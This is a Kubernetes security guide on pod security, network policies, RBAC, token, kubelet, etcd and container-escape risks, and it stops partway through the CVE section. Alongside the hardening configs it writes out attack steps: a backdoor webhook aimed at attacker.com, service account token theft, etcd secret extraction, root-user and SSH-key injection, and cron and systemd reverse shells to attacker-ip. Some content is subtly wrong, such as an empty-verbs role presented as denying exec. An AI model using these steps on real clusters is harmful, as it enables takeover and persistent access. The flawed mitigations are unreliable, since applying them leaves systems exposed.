# Kubernetes Security Architecture

## Pod Security, Network Policies, RBAC, and Cluster Attack Surfaces

---

## Table of Contents

1. [Kubernetes Architecture and Trust Boundaries](#1-kubernetes-architecture-and-trust-boundaries)
2. [Pod Security Standards and Enforcement](#2-pod-security-standards-and-enforcement)
3. [Kubernetes Network Policies](#3-kubernetes-network-policies)
4. [Kubernetes RBAC Deep Dive](#4-kubernetes-rbac-deep-dive)
5. [Service Account Token Risks](#5-service-account-token-risks)
6. [Kubelet Security](#6-kubelet-security)
7. [API Server Attack Surface](#7-api-server-attack-surface)
8. [etcd Security](#8-etcd-security)
9. [Pod-to-Node Escape Techniques](#9-pod-to-node-escape-techniques)
10. [Kubernetes CVEs](#10-kubernetes-cves)
11. [kubectl auth can-i Enumeration](#11-kubectl-auth-can-i-enumeration)
12. [Kubernetes Security Hardening](#12-kubernetes-security-hardening)

---

## 1. Kubernetes Architecture and Trust Boundaries

### 1.1 Control Plane Components

```
+------------------------------------------------------------------+
|                    Kubernetes Control Plane                       |
|                                                                    |
|  +------------------+    +------------------+    +---------------+ |
|  |   API Server     |    |   Scheduler      |    |  Controller   | |
|  |   (kube-apiserver|   |   (kube-scheduler)|   |  Manager      | |
|  |    :6443)        |    |                  |    |  (kube-control| |
|  |                  |    |                  |    |   ller-manager| |
|  |  - Authentication|    |  - Pod scheduling|    |  - Replication| |
|  |  - Authorization |    |  - Node scoring |    |  - Endpoints  | |
|  |  - Admission ctrl|    |  - Taints/toler. |    |  - ServiceAcct| |
|  +--------+---------+    +--------+---------+    +-------+-------+ |
|           |                       |                      |         |
+------------------------------------------------------------------+
           |                       |                      |
           v                       v                      v
  +------------------+    +------------------+    +------------------+
  |     etcd         |    |   Kubelet        |    |  kube-proxy      |
  |  (cluster state) |    |  (node agent)    |    |  (network proxy)|
  |                  |    |  :10250          |    |                  |
  |  - All config    |    |  - Pod lifecycle |    |  - iptables/IPVS|
  |  - All secrets   |    |  - Volume mounts |    |  - Service routing|
  |  - All RBAC      |    |  - Health checks |    |  - Network rules|
  +------------------+    +--------+---------+    +------------------+
                                    |
                                    v
                           +------------------+
                           | Container Runtime|
                           | (containerd/runc)|
                           +------------------+
```

### 1.2 Trust Boundaries in Kubernetes

| Boundary | Description | Attack Vector |
|---|---|---|
| **External → API Server** | Unauthenticated/anonymous access | kubectl, API proxy, exposed endpoint |
| **Pod → API Server** | Service account token theft | SSRF, environment variable leak |
| **Pod → Node** | Container escape | Privileged containers, hostPath mounts |
| **Pod → Pod** | Lateral movement | Insufficient network policies |
| **Node → Control Plane** | Kubelet credentials | Kubelet config file, bootstrap tokens |
| **User → API Server** | RBAC misconfiguration | Overly permissive roles |
| **etcd → All** | Cluster state database | Unauthenticated etcd access |
| **CI/CD → API Server** | Deployment pipeline compromise | Service account in CI/CD, kubeconfig leak |

### 1.3 The Kubernetes Attack Surface Map

```
+------------------------------------------------------------------+
|                    Kubernetes Attack Surface                       |
|                                                                    |
|  EXTERNAL                                                         |
|  ┌────────────┐   ┌────────────┐   ┌────────────┐                |
|  │ kubectl    │   │ Dashboard   │   │ API Proxy  │                |
|  │ access     │   │ (web UI)    │   │ (ingress)  │                |
|  └─────┬──────┘   └─────┬──────┘   └─────┬──────┘                |
|        │                │                │                          |
|        v                v                v                          |
|  ┌─────────────────────────────────────────────────┐              |
|  │              API Server (:6443)                  │              |
|  │   Authentication → Authorization → Admission    │              |
|  └─────────────────────────────────────────────────┘              |
|        │                │                │                          |
|        v                v                v                          |
|  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐      |
|  │ Scheduler│   │Controller│   │ etcd     │   │ Kubelet  │      |
|  │          │   │ Manager  │   │ (:2379)  │   │ (:10250) │      |
|  └──────────┘   └──────────┘   └──────────┘   └────┬─────┘      |
|                                                     │             |
|                                                     v             |
|  ┌──────────────────────────────────────────────────────────┐   |
|  │                    Node                                    │   |
|  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐   │   |
|  │  │  Pod A  │  │  Pod B  │  │  Pod C  │  │  Pod D  │   │   |
|  │  │ (priv)  │  │ (sa:adm)│  │ (norm)  │  │ (escal) │   │   |
|  │  └─────────┘  └─────────┘  └─────────┘  └─────────┘   │   |
|  │       ↑              ↑            ↑           ↑          │   |
|  │       │              │            │           │          │   |
|  │  hostPath  ───────────│────────────│───────────│          │   |
|  │  mount               │            │           │          │   |
|  │              Service Account       │           │          │   |
|  │              Token Theft           │           │          │   |
|  └──────────────────────────────────────────────────────────┘   |
+------------------------------------------------------------------+
```

---

## 2. Pod Security Standards and Enforcement

### 2.1 Pod Security Standards (PSS)

Kubernetes Pod Security Standards define three policy levels:

| Level | Description | Use Case |
|---|---|---|
| **Privileged** | Unrestricted pod behavior | System pods, node-level daemons |
| **Baseline** | Minimally restrictive, prevents known privilege escalations | General workloads |
| **Restricted** | Heavily restricted, follows security best practices | Security-critical workloads |

### 2.2 Baseline Policy Controls

```yaml
# Basine Policy: Controls that MUST be enforced
# (prevents known privilege escalation vectors)

# Must NOT be privileged
spec.securityContext.privileged: false

# Must NOT use host namespaces
spec.hostNetwork: false
spec.hostPID: false
spec.hostIPC: false

# Must NOT use hostPath mounts
spec.volumes[*].hostPath: <not allowed>

# Must NOT use harmful capabilities
spec.securityContext.capabilities.add:
  - Must NOT include: NET_RAW, SYS_ADMIN, SYS_PTRACE, etc.

# Host ports must be restricted
spec.containers[*].hostPort: <not allowed>

# Must NOT modify /proc mount type
spec.securityContext.procMount: Default

# Must NOT use Seccomp custom profiles (only RuntimeDefault or Localhost)
spec.securityContext.seccompProfile.type: Must be RuntimeDefault or Localhost
```

### 2.3 Restricted Policy Controls

```yaml
# Restricted Policy: Additional controls beyond Baseline
# Strongly recommended for security-critical workloads

apiVersion: v1
kind: Pod
metadata:
  name: restricted-pod
spec:
  securityContext:
    runAsNonRoot: true        # Must run as non-root
    runAsUser: 1000          # Must specify non-zero UID
    runAsGroup: 1000         # Must specify non-zero GID
    fsGroup: 1000            # Must specify FS group
    seccompProfile:
      type: RuntimeDefault  # Must use default seccomp
  containers:
  - name: app
    image: gcr.io/distroless/static
    securityContext:
      allowPrivilegeEscalation: false  # Must prevent privilege escalation
      readOnlyRootFilesystem: true     # Must have read-only root FS
      capabilities:
        drop:
          - ALL            # Must drop ALL capabilities
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir:
      medium: Memory
```

### 2.4 Pod Security Admission (PSA)

```yaml
# Pod Security Admission configuration
# Enforces Pod Security Standards at the namespace level

apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: v1.27
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/audit-version: v1.27
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: v1.27
---
apiVersion: v1
kind: Namespace
metadata:
  name: dev
  labels:
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

---

## 3. Kubernetes Network Policies

### 3.1 Network Policy Architecture

Network policies control traffic flow at the IP address/port level. They are the Kubernetes equivalent of cloud Security Groups / NSGs.

```
+------------------------------------------------------------------+
|                    Network Policy Architecture                    |
|                                                                    |
|  Namespace: production                                           |
|  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐              |
|  │   Pod A     │  │   Pod B     │  │   Pod C     │              |
|  │ (frontend) │  │ (backend)   │  │ (database)  │              |
|  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘              |
|         │                │                │                      |
|         │ Ingress:        │ Ingress:       │ Ingress:            |
|         │ - from: any     │ - from: Pod A   │ - from: Pod B      |
|         │ - port: 80      │ - port: 8080    │ - port: 5432       |
|         │                 │                 │                     |
|         │ Egress:         │ Egress:         │ Egress:             |
|         │ - to: Pod B     │ - to: Pod C     │ - to: DNS (53)     |
|         │ - port: 8080    │ - port: 5432    │ - to: monitoring   |
|         │                 │                 │                     |
+------------------------------------------------------------------+
```

### 3.2 Default-Deny Network Policy

```yaml
# CRITICAL: Default-deny all ingress and egress
# This should be the baseline for every namespace

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}  # Applies to all pods in the namespace
  policyTypes:
    - Ingress
    - Egress
---
# Allow DNS egress (required for service discovery)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns-egress
  namespace: production
spec:
  podSelector: {}  # All pods
  policyTypes:
    - Egress
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - protocol: UDP
          port: 53
        - protocol: TCP
          port: 53
```

### 3.3 Application Network Policy

```yaml
# Frontend → Backend → Database policy chain

# Frontend: allow ingress from internet, egress to backend
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: frontend-policy
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: frontend
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - ipBlock:
            cidr: 0.0.0.0/0
      ports:
        - port: 80
          protocol: TCP
        - port: 443
          protocol: TCP
  egress:
    - to:
        - podSelector:
            matchLabels:
              app: backend
      ports:
        - port: 8080
          protocol: TCP
    - to:  # Allow DNS
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - port: 53
          protocol: UDP
---
# Backend: allow ingress from frontend, egress to database
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend-policy
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: frontend
      ports:
        - port: 8080
          protocol: TCP
  egress:
    - to:
        - podSelector:
            matchLabels:
              app: database
      ports:
        - port: 5432
          protocol: TCP
---
# Database: allow ingress from backend only, no egress
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: database-policy
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: backend
      ports:
        - port: 5432
          protocol: TCP
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - port: 53
          protocol: UDP
```

---

## 4. Kubernetes RBAC Deep Dive

### 4.1 RBAC Architecture

```
+------------------------------------------------------------------+
|                    Kubernetes RBAC Architecture                   |
|                                                                    |
|  +------------------+     +------------------+                     |
|  |   Role           |     |   ClusterRole     |                    |
|  | (namespace-scoped)|    | (cluster-scoped)  |                    |
|  |  rules:           |    |  rules:            |                    |
|  |  - apiGroups      |    |  - apiGroups       |                    |
|  |  - resources      |    |  - resources       |                    |
|  |  - verbs          |    |  - verbs           |                    |
|  +--------+---------+     +--------+---------+                     |
|           |                         |                              |
|           v                         v                              |
|  +------------------+     +------------------+                     |
|  | RoleBinding      |     | ClusterRoleBinding|                    |
|  | (namespace-scoped)|    | (cluster-scoped)   |                    |
|  |  subjects:        |    |  subjects:         |                    |
|  |  - User/Group/SA |    |  - User/Group/SA  |                    |
|  |  roleRef:        |    |  roleRef:           |                    |
|  |  - Role          |    |  - ClusterRole      |                    |
|  +------------------+     +------------------+                     |
+------------------------------------------------------------------+
```

### 4.2 Dangerous RBAC Permissions

```yaml
# DANGEROUS: cluster-admin equivalent (full cluster access)
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: dangerous-cluster-admin
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
# This grants full access to every resource in the cluster
# Including secrets, configmaps, pods, nodes, etc.

---
# DANGEROUS: Can create pods with any service account
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pod-creator-escalation
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create", "update", "patch"]
# An attacker can create pods with arbitrary service accounts,
# including ones with cluster-admin privileges

---
# DANGEROUS: Can read all secrets
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: secret-reader
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list", "watch"]
# Reading secrets gives access to:
# - Service account tokens (cluster escalation)
# - TLS private keys (MITM)
# - Database passwords (data exfiltration)
# - API keys (cloud resource access)

---
# DANGEROUS: Can create/modify RBAC
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: rbac-escalation
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["roles", "clusterroles", "rolebindings", "clusterrolebindings"]
  verbs: ["create", "update", "patch", "delete"]
# This allows direct privilege escalation by creating new roles
```

### 4.3 RBAC Privilege Escalation Paths

```bash
# Path 1: Create pod → steal service account token → escalate
# Prerequisite: create pods permission in any namespace
kubectl run escalate --image=alpine --serviceaccount=cluster-admin-sa -n kube-system -- sleep 999999
# The pod will have the cluster-admin service account mounted at:
# /var/run/secrets/kubernetes.io/serviceaccount/token

# Path 2: Create/modify rolebindings → grant yourself cluster-admin
# Prerequisite: create rolebindings permission
kubectl create clusterrolebinding escalate-binding \
  --clusterrole=cluster-admin \
  --user=attacker@company.com

# Path 3: Create secret with service account token
# Prerequisite: create secrets permission
kubectl create secret generic stole-token --from-literal=token=$(kubectl get secrets cluster-admin-sa-token -n kube-system -o jsonpath='{.data.token}' | base64 -d) -n default

# Path 4: Patch deployment to use privileged service account
# Prerequisite: update deployments permission
kubectl patch deployment target-deployment -n production -p '{"spec":{"template":{"spec":{"serviceAccountName":"cluster-admin-sa"}}}}'

# Path 5: Create webhook admission controller
# Prerequisite: create mutatingwebhookconfigurations / validatingwebhookconfigurations
kubectl create -f - <<EOF
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: backdoor-webhook
webhooks:
- name: backdoor.example.com
  clientConfig:
    url: https://attacker.com/webhook
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
EOF
# This webhook can intercept all pod creation requests
```

---

## 5. Service Account Token Risks

### 5.1 Service Account Token Architecture

```
+------------------------------------------------------------------+
|                Service Account Token Flow                          |
|                                                                    |
|  1. Pod created with default service account                      |
|  ┌──────────┐                                                      |
|  │  Pod     │                                                      |
|  │  ┌────┐  │  /var/run/secrets/kubernetes.io/serviceaccount/       |
|  │  │   │  │  ├── ca.crt          (cluster CA certificate)        |
|  │  │   │  │  ├── namespace       (pod namespace)                  |
|  │  │   │  │  └── token            (JWT bearer token)              |
|  │  └────┘  │                                                      |
|  └──────────┘                                                      |
|       │                                                            |
|       │ Bearer token included in every API request                 |
|       │ Authorization: Bearer eyJhbGciOiJSUzI1NiIs...            |
|       v                                                            |
|  ┌─────────────────────────────────────────────────┐              |
|  │              API Server                          │              |
|  │  - Validates token signature (webhook or static) │              |
|  │  - Looks up service account                       │              |
|  │  - Evaluates RBAC rules                           │              |
|  │  - Returns response                               │              |
|  └─────────────────────────────────────────────────┘              |
+------------------------------------------------------------------+
```

### 5.2 Legacy vs. Projected Service Account Tokens

```bash
# Legacy (pre-1.20) service account tokens:
# - Created automatically with the service account
# - Stored as a Secret in etcd
# - Never expire
# - Can be used from anywhere (exfiltration risk)

# Projected (1.20+) service account tokens:
# - Created on-demand by the kubelet
# - Mounted as a projected volume
# - Time-bound (default 1 hour)
# - Audience-bound (only valid for specified API server)
# - Automatically rotated (kubelet refreshes before expiry)

# Check which type of tokens are in use:
kubectl get secrets -n kube-system | grep sa-token
# Legacy tokens appear as: <sa-name>-token-<random>
# Projected tokens are not stored as secrets

# Disable legacy token auto-mounting:
# In pod spec:
automountServiceAccountToken: false
```

### 5.3 Service Account Token Theft

```bash
# From inside a compromised pod:
# Step 1: Read the service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Step 2: Determine the service account's permissions
curl -s --cacert $CA_CERT \
  -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -X POST -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'$NAMESPACE'"}}'

# Step 3: List accessible resources
curl -s --cacert $CA_CERT \
  -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets"

# Step 4: Exfiltrate the token for external use
# The token can be used from anywhere with network access to the API server
# Configure kubectl with the stolen token:
kubectl config set-cluster stolen-cluster --server=https://api-server:6443 --certificate-authority=ca.crt
kubectl config set-credentials stolen-sa --token=$TOKEN
kubectl config set-context stolen-context --cluster=stolen-cluster --user=stolen-sa --namespace=$NAMESPACE
kubectl config use-context stolen-context

# Step 5: Enumerate and escalate
kubectl auth can-i --list
kubectl get secrets -A
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.serviceAccountName}{"\n"}{end}'
```

---

## 6. Kubelet Security

### 6.1 Kubelet Attack Surface

The kubelet runs on every node and is responsible for pod lifecycle management. It exposes several APIs that are frequently misconfigured:

```bash
# Kubelet default ports:
# 10250 - HTTPS API (authentication required by default in 1.20+)
# 10255 - Read-only HTTP API (DEPRECATED, but still present in many clusters)
# 10256 - Healthz endpoint

# Attack 1: Anonymous access to kubelet API
curl -sk https://<node-ip>:10250/pods
# If anonymous authentication is enabled, this returns all pod info including:
# - Environment variables (may contain secrets)
# - Volume mounts (may contain credentials)
# - Service account token mount paths

# Attack 2: Read-only port (10255)
curl -s http://<node-ip>:10255/pods
# This port provides unauthenticated read access to:
# - Pod status and configuration
# - Node metrics
# - Container logs

# Attack 3: Exec into containers via kubelet
curl -sk https://<node-ip>:10250/exec/<namespace>/<pod>/<container>?command=/bin/sh&stdout=1&stderr=1&tty=1
# If authentication is misconfigured, allows arbitrary command execution

# Attack 4: Retrieve container logs (may contain sensitive data)
curl -sk https://<node-ip>:10250/log/<namespace>/<pod>/<container>
```

### 6.2 Kubelet Configuration Hardening

```yaml
# Kubelet configuration for security
# /var/lib/kubelet/config.yaml

apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration

# Authentication
authentication:
  anonymous:
    enabled: false  # CRITICAL: Disable anonymous access
  webhook:
    enabled: true   # Use API server for authentication
  x509:
    clientCAFile: /etc/kubernetes/pki/ca.crt

# Authorization
authorization:
  mode: Webhook    # Use API server RBAC for authorization

# Read-only port
readOnlyPort: 0    # CRITICAL: Disable read-only port (was 10255)

# Streaming connection idle timeout
streamingConnectionIdleTimeout: 5m

# Event recording
eventRecordQPS: 50
eventBurst: 100

# Protect kernel defaults
protectKernelDefaults: true

# Seccomp default
seccompDefault: true

# Rotate certificates
rotateCertificates: true
serverTLSBootstrap: true
```

---

## 7. API Server Attack Surface

### 7.1 API Server Authentication Flow

```
+------------------------------------------------------------------+
|                    API Server Authentication                       |
|                                                                    |
|  Request → Authentication → Authorization → Admission → Handler  |
|                                                                    |
|  Authentication Methods:                                           |
|  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           |
|  │ Client certs  │  │ Bearer tokens│  │ OIDC tokens  │           |
|  │ (x509)       │  │ (SA tokens)  │  │ (external)   │           |
|  └──────────────┘  └──────────────┘  └──────────────┘           |
|  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           |
|  │ Webhook auth │  │ Static tokens │  │ Basic auth   │           |
|  │ (external)   │  │ (deprecated) │  │ (deprecated) │           |
|  └──────────────┘  └──────────────┘  └──────────────┘           |
|                                                                    |
|  Authorization Methods:                                             |
|  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           |
|  │ RBAC         │  │ ABAC         │  │ Node auth    │           |
|  │ (recommended)│  │ (deprecated) │  │ (kubelets)   │           |
|  └──────────────┘  └──────────────┘  └──────────────┘           |
|                                                                    |
|  Admission Controllers:                                             |
|  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           |
|  │ PodSecurity  │  │ LimitRanger  │  │ ServiceAcct  │           |
|  │ (PSA)        │  │              │  │              │           |
|  └──────────────┘  └──────────────┘  └──────────────┘           |
|  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           |
|  │ ResourceQuota│  │ MutatingWeb  │  │ ValidatingWeb│           |
|  │              │  │ hook         │  │ hook         │           |
|  └──────────────┘  └──────────────┘  └──────────────┘           |
+------------------------------------------------------------------+
```

### 7.2 API Server Misconfigurations

```bash
# Common API server security misconfigurations:

# 1. Anonymous authentication enabled
# In kube-apiserver manifest:
# --anonymous-auth=true  (DANGEROUS - should be false)

# Test: Can anonymous users access the API?
curl -sk https://api-server:6443/api/v1/namespaces/default/pods

# 2. Insecure port enabled (deprecated but sometimes present)
# --insecure-port=8080  (DANGEROUS - should be 0)
# --insecure-bind-address=0.0.0.0  (EVEN MORE DANGEROUS)

# 3. Missing audit logging
# --audit-log-path=/var/log/kubernetes/audit.log
# --audit-log-maxage=30
# --audit-log-maxsize=100
# --audit-policy-file=/etc/kubernetes/audit-policy.yaml

# 4. Permissive RBAC
# Default service account with excessive permissions
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[] | "\(.kind) \(.name)"'

# 5. Etcd accessible without authentication
# Check if etcd is accessible:
ETCDCTL_API=3 etcdctl --endpoints=https://etcd-server:2379 --insecure-skip-tls-verify get / --prefix --keys-only
```

---

## 8. etcd Security

### 8.1 etcd Architecture and Risks

etcd is the single source of truth for the entire Kubernetes cluster. It stores all cluster state including secrets, RBAC policies, and pod specifications.

```bash
# etcd data structure:
# /registry/namespaces/<name>
# /registry/pods/<namespace>/<name>
# /registry/secrets/<namespace>/<name>
# /registry/configmaps/<namespace>/<name>
# /registry/roles/<namespace>/<name>
# /registry/clusterroles/<name>
# /registry/serviceaccounts/<namespace>/<name>

# Accessing etcd directly (if misconfigured):
ETCDCTL_API=3 etcdctl \
  --endpoints=https://etcd01:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/default --prefix --keys-only

# Exfiltrating a secret from etcd:
ETCDCTL_API=3 etcdctl \
  --endpoints=https://etcd01:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/peer.crt \
  --key=/etc/kubernetes/pki/etcd/peer.key \
  get /registry/secrets/default/db-password

# Warning: etcd stores all data in plaintext (including secrets)
# unless encryption at rest is configured (see below)
```

### 8.2 Encryption at Rest

```yaml
# EncryptionConfiguration for etcd encryption
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
      - configmaps
      - tokens
    providers:
      - aescbc:
          keys:
            - name: key1
              secret: <base64-encoded-32-byte-key>
      - aescbc:
          keys:
            - name: key2
              secret: <base64-encoded-32-byte-key>
      - identity: {}  # Fallback to plaintext (for migration)

# Apply to API server:
# --encryption-provider-config=/etc/kubernetes/encryption-config.yaml

# Encrypt existing secrets:
kubectl get secrets --all-namespaces -o json | kubectl replace -f -
```

---

## 9. Pod-to-Node Escape Techniques

### 9.1 Escape Taxonomy

| Technique | Prerequisites | Detection |
|---|---|---|
| **Privileged container** | `securityContext.privileged: true` | K8s audit, Falco |
| **hostPath mount** | `volumes.hostPath` | K8s audit, admission webhook |
| **docker.sock mount** | `/var/run/docker.sock` mounted | Falco, runtime detection |
| **Capability escalation** | `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE` | K8s audit, seccomp |
| **Node-level directory mount** | `hostPath: /` | Admission webhook |
| **Service account escalation** | Overprivileged SA token | API audit log |
| **Kernel vulnerability** | Kernel CVE (DirtyPipe, etc.) | eBPF monitoring |
| **Cloud metadata** | SSRF to 169.254.169.254 | Network policy, Falco |

### 9.2 Privileged Container Escape

```bash
# A privileged container has ALL Linux capabilities and device access
# This is equivalent to root on the host

# Step 1: Confirm we're in a privileged container
cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff  (all capabilities set)

# Step 2: Access host filesystem
mount /dev/sda1 /mnt
# OR
mount /dev/vda1 /mnt

# Step 3: Modify host files
echo 'attacker:x:0:0:root:/root:/bin/bash' >> /mnt/etc/passwd
echo 'attacker:$6$salt$hash:0:0:99999::::' >> /mnt/etc/shadow

# Step 4: Create cron job for persistence
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"' >> /mnt/etc/crontab

# Step 5: Access Kubernetes node configuration
cat /mnt/etc/kubernetes/kubelet.conf
cat /mnt/var/lib/kubelet/config.yaml
cat /mnt/etc/kubernetes/admin.conf

# Step 6: Use kubeconfig to control the cluster
export KUBECONFIG=/mnt/etc/kubernetes/admin.conf
# Now the attacker has cluster-admin access
```

### 9.3 hostPath Volume Mount Escape

```yaml
# DANGEROUS hostPath mounts that enable node escape:

# 1. Full filesystem access
volumes:
- name: host-root
  hostPath:
    path: /
    type: DirectoryOrCreate

# 2. Docker socket access (allows container management on host)
volumes:
- name: docker-sock
  hostPath:
    path: /var/run/docker.sock

# 3. Kubernetes configuration access
volumes:
- name: k8s-config
  hostPath:
    path: /etc/kubernetes

# 4. Host /etc access (passwd, shadow, hosts)
volumes:
- name: host-etc
  hostPath:
    path: /etc

# 5. Host cgroup access (cgroups escape vector)
volumes:
- name: host-cgroups
  hostPath:
    path: /sys/fs/cgroup
```

```bash
# Escaping via hostPath mount:
# If / is mounted as hostPath:

# Read host files
cat /host/etc/shadow
cat /host/etc/kubernetes/admin.conf
cat /host/var/lib/kubelet/config.yaml

# Write SSH authorized keys
mkdir -p /host/root/.ssh
echo "ssh-rsa AAAA... attacker@evil" >> /host/root/.ssh/authorized_keys
ssh root@node-ip

# Write systemd service for persistence
cat > /host/etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
chroot /host systemctl enable backdoor.service
```

### 9.4 Docker Socket Escape

```bash
# If /var/run/docker.sock is mounted inside the container:

# Step 1: Install Docker CLI in the container
apk add docker-cli  # Alpine
# OR
apt-get install docker.io  # Debian/Ubuntu

# Step 2: List containers on the host
docker -H unix:///var/run/docker.sock ps -a

# Step 3: Run a privileged container on the host
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# Step 4: Alternatively, execute commands in existing containers
docker -H unix:///var/run/docker.sock exec -it <container-id> /bin/sh

# Step 5: Create a container with host network and PID namespace
docker -H unix:///var/run/docker.sock run \
  --network host \
  --pid host \
  -v /etc/kubernetes:/etc/kubernetes \
  -it alpine sh
```

---

## 10. Kubernetes CVEs

### 10.1 CVE-2018-1002105 — API Server Request Smuggling

| Field | Detail |
|---|---|
| **CVE** | CVE-2018-1002105 |
| **CVSS** | 9.8 (Critical) |
| **Affected** | Kubernetes 1.0.x - 1.12.3 |
| **Type** | API server request smuggling / proxy handling |
| **Impact** | Privilege escalation to cluster-admin |

**Technical Details**: The vulnerability existed in the kube-apiserver's handling of upgrade requests (used for `kubectl exec`, `kubectl port-forward`, `kubectl attach`). The API server did not properly validate the end of an upgrade response, allowing an attacker to inject a second HTTP request within the same TLS connection.

```
+------------------------------------------------------------------+
|                    CVE-2018-1002105 Attack Flow                    |
|                                                                    |
|  Attacker Pod                                                      |
|       |                                                            |
|       | 1. kubectl exec (upgrade request)                          |
|       v                                                            |
|  +------------------------------------------------------------+   |
|  |              API Server                                     |   |
|  |  - Receives upgrade request                                 |   |
|  |  - Proxies to kubelet                                       |   |
|  |  - Does NOT properly terminate the upgrade stream           |   |
|  +------------------------------------------------------------+   |
|       |                                                            |
|       | 2. Attacker injects second request in same connection     |
|       v                                                            |
|  +------------------------------------------------------------+   |
|  |              etcd                                           |   |
|  |  - Second request is processed with elevated privileges     |   |
|  |  - Attacker can read/modify any cluster resource            |   |
|  +------------------------------------------------------------+   |
+------------------------------------------------------------------+
```

```bash
# The attack allowed any authenticated user to escalate to cluster-admin
# by smuggling a second request within the upgrade stream

# Mitigation:
# 1. Upgrade Kubernetes to 1.12.4 or later
# 2. Restrict who can use kubectl exec/port-forward (RBAC)
# 3. Enable audit logging to detect exploitation

# RBAC restriction:
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: restrict-exec
  namespace: production
rules:
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: []  # Deny all exec access
```

### 10.2 CVE-2022-3172 — kube-apiserver Aggregated API Server SSRF

| Field | Detail |
|---|---|
| **CVE** | CVE-2022-3172 |
| **CVSS** | 8.2 (High) |
| **Affected** | kube-apiserver up to 1.21.14, 1.22.0-1.22.13, 1.23.0-1.23.10, 1.24.0-1.24.4, and 1.25.0 |
| **Type** | Server-Side Request Forgery (CWE-918) in kube-apiserver |
| **Impact** | Aggregated API server redirects client traffic, potentially forwarding API server credentials to third parties |

**Technical Details**: An aggregated API server can redirect client traffic to any URL, causing the client to perform unexpected actions and potentially forwarding the client's API server credentials to third parties. Fixed in 1.22.14, 1.23.11, 1.24.5, and 1.25.1.

### 10.3 CVE-2023-2727 — Kubernetes ImagePolicy Webhook Bypass

| Field | Detail |
|---|---|
| **CVE** | CVE-2023-2727 |
| **CVSS** | 6.5 (Medium) |
| **Affected** | Kubernetes 1.27.0-1.27.2 (with ImagePolicy webhook) |
